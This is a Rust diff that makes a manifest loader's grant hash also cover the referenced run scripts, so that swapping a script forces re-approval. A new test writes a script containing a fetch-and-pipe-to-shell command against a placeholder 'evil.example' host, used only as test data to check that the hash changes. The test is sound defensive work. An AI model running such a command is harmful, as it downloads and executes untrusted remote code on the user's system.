@@ -138,12 +138,23 @@ fn default_order() -> u32 {
     50
 }
 
-/// A loaded manifest plus the hash grants pin to. The hash is over the raw
-/// file bytes: any edit — even whitespace — detaches approvals. Cheap, and
-/// the conservative direction for a security artifact.
+/// A loaded manifest plus the hashes the grant ledger pins to.
+///
+/// `hash` is the full version identity: manifest bytes folded with the code
+/// hash. Grants (is_approved/approved/may) key on it, so ANY edit — manifest
+/// or script — detaches approvals until re-decided.
+///
+/// `code_hash` covers only the referenced executables (process.run, hook
+/// runs, provider runs). It gates carry-over: when a manifest-only edit adds
+/// or removes a request, the unchanged requests carry forward *because the
+/// code is unchanged* (browser-extension semantics — only the delta
+/// re-prompts). When a script changes, code_hash changes, nothing carries,
+/// and every capability re-enters review: a grant authorizes code, not just
+/// a declaration, so new code is always re-approved.
 pub struct LoadedManifest {
     pub manifest: Manifest,
     pub hash: String,
+    pub code_hash: String,
 }
 
 pub fn load(pkg_dir: &Path) -> Result<Option<LoadedManifest>> {
@@ -162,8 +173,36 @@ pub fn load(pkg_dir: &Path) -> Result<Option<LoadedManifest>> {
             anyhow::bail!("{}: process.restart must be \"backoff\" or \"never\", got {:?}", f.display(), p.restart);
         }
     }
-    let hash = format!("{:x}", Sha256::digest(&raw));
-    Ok(Some(LoadedManifest { manifest: m, hash }))
+    // code_hash = each referenced executable's bytes in a fixed order
+    // (relative path + contents, so a rename is also a change). A missing
+    // script hashes as its path + a sentinel — its later appearance is itself
+    // a code change that re-prompts.
+    let mut runs: Vec<String> = Vec::new();
+    if let Some(p) = &m.process {
+        runs.push(p.run.clone());
+    }
+    runs.extend(m.hook.iter().map(|h| h.run.clone()));
+    runs.extend(m.provider.iter().map(|p| p.run.clone()));
+    runs.sort();
+    runs.dedup();
+    let mut code = Sha256::new();
+    for rel in &runs {
+        code.update(b"\x00run\x00");
+        code.update(rel.as_bytes());
+        code.update(b"\x00");
+        match std::fs::read(pkg_dir.join(rel)) {
+            Ok(bytes) => code.update(&bytes),
+            Err(_) => code.update(b"<absent>"),
+        }
+    }
+    let code_hash = format!("{:x}", code.finalize());
+    // Full version identity = manifest bytes folded with the code hash.
+    let mut full = Sha256::new();
+    full.update(&raw);
+    full.update(b"\x00code\x00");
+    full.update(code_hash.as_bytes());
+    let hash = format!("{:x}", full.finalize());
+    Ok(Some(LoadedManifest { manifest: m, hash, code_hash }))
 }
 
 /// Minimal SKILL.md frontmatter reader: name + description. Deliberately not a
@@ -224,14 +263,32 @@ run  = "scripts/echo"
 "#,
         )
         .unwrap();
+        std::fs::create_dir_all(dir.join("scripts")).unwrap();
+        std::fs::write(dir.join("scripts/echo"), "#!/bin/sh\necho hi\n").unwrap();
         let lm = load(&dir).unwrap().unwrap();
         assert_eq!(lm.manifest.request.subscribe, vec!["work/demo/echo"]);
         assert_eq!(lm.manifest.process.as_ref().unwrap().mode, "exec");
         assert_eq!(lm.hash.len(), 64);
-        // Any byte change detaches: hash must move.
+        // Any manifest byte change detaches: hash must move.
         std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe = [\"#\"]\n").unwrap();
         let lm2 = load(&dir).unwrap().unwrap();
         assert_ne!(lm.hash, lm2.hash);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn editing_run_script_detaches_grants() {
+        // The grant pins CODE, not just the declaration: swapping scripts/main
+        // while leaving elanus.toml untouched must move the hash so approvals
+        // re-enter pending.
+        let dir = std::env::temp_dir().join(format!("el-man-code-{}", std::process::id()));
+        std::fs::create_dir_all(dir.join("scripts")).unwrap();
+        std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe=[\"work/x\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
+        std::fs::write(dir.join("scripts/main"), "#!/bin/sh\necho benign\n").unwrap();
+        let before = load(&dir).unwrap().unwrap().hash;
+        std::fs::write(dir.join("scripts/main"), "#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        let after = load(&dir).unwrap().unwrap().hash;
+        assert_ne!(before, after, "editing the run script must change the grant hash");
         std::fs::remove_dir_all(&dir).ok();
     }
 
